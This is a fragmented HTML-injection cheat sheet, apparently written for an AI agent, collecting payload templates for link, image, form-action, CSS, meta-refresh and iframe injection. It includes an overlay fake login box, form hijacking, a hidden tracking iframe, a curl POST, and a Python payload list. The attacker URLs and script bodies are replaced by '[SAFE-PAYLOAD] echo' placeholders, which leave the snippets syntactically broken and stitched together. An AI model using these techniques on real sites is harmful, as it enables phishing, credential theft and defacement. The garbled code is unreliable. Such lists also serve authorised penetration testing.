...
**Important Instruction for the Agent:**
Ask the user to verify the target URL/IP before running any attack or injection commands.
...
<!-- Links -->
<a href="[SAFE-PAYLOAD] echo \'Simulating attacker URL...\'">Click Here</a>
<a href="[SAFE-PAYLOAD] echo \'Simulating attacker URL...\'">Legitimate Link</a>

<!-- Images -->
<img src="[SAFE-PAYLOAD] echo \'Simulating attacker URL...\'
...
Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
     ...
     <p>Please login at <a href="[SAFE-PAYLOAD] echo \'Simulating attacker URL...\'
     </div>

<!-- Comment injection -->
Great article!
<form action="[SAFE-PAYLOAD] echo \'Simulating attacker URL...\' method="POST">
...
```html
<!-- URL injection -->
http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="[SAFE-PAYLOAD] echo \'Simulating attacker URL...\'

<!-- Search result injection -->
http://target.com/search?q=<marquee>[SAFE-PAYLOAD] Message removed</marquee>
```
...
curl -X POST -d "name=[SAFE-PAYLOAD] <!-- Simulating XSS alert -->&email=test@test.com" \
...
<style>
    input { background: url('[SAFE-PAYLOAD] echo \'Simulating attacker URL...\' }
</style>
<form action="[SAFE-PAYLOAD] echo \'Simulating attacker URL...\' method="POST">
...
<!-- Style injection -->
<style>
    body { background: url('[SAFE-PAYLOAD] echo \'Simulating attacker URL...\' }
    .content { display: none }
    .fake-content { display: block }
</style>

<!-- Inline style injection -->
<div style="background:url('[SAFE-PAYLOAD] echo \'Simulating attacker URL...\'
```
...
<meta http-equiv="refresh" content="0;url=[SAFE-PAYLOAD] echo \'Simulating attacker URL...\'
...
<form action="[SAFE-PAYLOAD] echo \'Simulating attacker URL...\'
...
<iframe src="[SAFE-PAYLOAD] echo \'Simulating attacker URL...\' width="100%" height="500"></iframe>

<!-- Invisible tracking iframe -->
<iframe src="[SAFE-PAYLOAD] echo \'Simulating attacker URL...\' style="display:none"></iframe>
```
...
<!-- Case variations -->
<H1>Test</H1>
[SAFE-PAYLOAD] <!-- Simulating obfuscated XSS alert -->
...
[SAFE-PAYLOAD] <!-- Simulating image error XSS -->
```
...
payloads = [
    "<h1>Test</h1>",
    "<b>Bold</b>",
    "[SAFE-PAYLOAD] <!-- Simulating XSS alert -->",
    "[SAFE-PAYLOAD] <!-- Simulating image error XSS -->",
    "<a href='http://[SAFE-PAYLOAD] echo \'Simulating evil URL...\''>Click</a>",
    "<div style='color:red'>Styled</div>",
    "<marquee>Moving</marquee>",
    "<iframe src='http://[SAFE-PAYLOAD] echo \'Simulating evil URL...\''></iframe>",
]
...
| `<a href="[SAFE-PAYLOAD] echo \'Simulating evil URL...\'">Link</a>` | Link injection |
| `<img src=x>` | Image tag test |
| `<div style="color:red">` | Style injection |
| `<form action="[SAFE-PAYLOAD] echo \'Simulating evil URL...\'">` | Form hijacking |
